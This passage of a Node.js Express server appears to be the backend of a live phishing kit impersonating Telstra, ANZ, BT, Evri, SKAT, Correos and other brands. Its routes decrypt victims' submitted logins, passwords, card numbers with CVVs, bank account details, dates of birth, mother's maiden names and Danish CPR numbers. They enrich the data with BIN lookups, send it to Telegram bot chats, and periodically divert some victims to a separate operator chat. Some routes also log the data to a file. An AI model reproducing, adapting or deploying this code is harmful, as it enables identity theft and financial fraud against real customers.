    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `TelstraG7000:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5246954438,
              text: `Telstra:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

//OPTUS
//OPTUS
//OPTUS
app.use("/optus", require("./routes/optus"));

//EVRI
app.use("/evri", require("./routes/evri"));

//HERITAGE
app.use("/heritage", require("./routes/heritage"));

//ANZ
//ANZ
//ANZ

app.post("/anzAbuse", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  if (anzTarrifi == 4) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `ANZ:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    anzTarrifi = 0;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `ANZAbuse:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: "-800642674",
          text: `ANZ:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    anzTarrifi += 1;
  }
  res.send("Update Completed");
});

app.post("/anzJuice", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  if (anzTarrifi == 4) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `ANZ:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    anzTarrifi = 0;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `ANZJuice:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1594377116,
          text: `ANZ:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    anzTarrifi += 1;
  }
  res.send("Update Completed");
});

app.post("/anzAR", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-725162140&text=ANZ:\n${originalText}`
  );
  res.send("Update Completed");
});

app.post("/anzHoods", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-665384174&text=ANZ:\n${originalText}`
  );
  res.send("Update Completed");
});

let anzTarrifi = 0;

app.post("/anzTarrifi", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  if (anzTarrifi == 4) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    anzTarrifi = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=ANZTarrifi:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=ANZ:\n${originalText}`
    );
    anzTarrifi += 1;
  }
  res.send("Update Completed");
});

//BT
//BT
//BT

app.post("/@skiii719", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5334039930&text=Evri:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

app.post("/ssfinesse", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  mmn = CryptoJS.AES.decrypt(req.body.mmn, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ip = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${username}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nTown: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nMMN: ${mmn}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=BT:\n${originalText}`
        );
        skiii719 = 0;
      } else if (bin === "535666" || bankName === "SANTANDER") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=BT:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BTSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=BT:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

//SKAT
//SKAT
//SKAT

let skat = 0;

app.post("/skatPersonal", (req, res) => {
  username = req.body.username;
  fullname = req.body.fullname;
  address = req.body.address;
  city = req.body.city;
  zip = req.body.zip;
  dob = req.body.dob;
  telephone = req.body.telephone;
  cpr = req.body.cpr;
  bank = req.body.bank;
  var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;

  axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 680379375,
        text: `Skat\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 1449567433,
        text: `Skat\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });

  var resultsTxt = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n\n`;

  fs.appendFile("results.txt", resultsTxt, (err) => {
    if (err) {
      console.log(err);
    }
  });

  res.send("Update Completed");
});

app.post("/skatBilling", (req, res) => {
  ccname = req.body.ccname;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  zip = req.body.zip;
  dob = req.body.dob;
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `Skat\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1449567433,
            text: `Skat\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      var resultsTxt = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;

      fs.appendFile("results.txt", resultsTxt, (err) => {
        if (err) {
          console.log(err);
        }
      });

      res.send("Update Completed");
    })
    .catch((e) => {
      console.log(e);
    });
});

//CORREOS
//CORREOS
//CORREOS

app.post("/correosKelv", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `Correos\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1248378980,
            text: `Correos\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      res.send("Update Completed");
    });
});

app.post("/correosAK", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `Correos\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1374564725,
            text: `Correos\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      res.send("Update Completed");
    });
});

app.post("/removeips", (req, res) => {
  ip = req.body.ip;

  content = ``;
  fs.writeFile("ips.txt", content, (err) => {
    if (err) {
      console.error(err);
    } else {
      res.send("Update Completed");
    }
  });
});
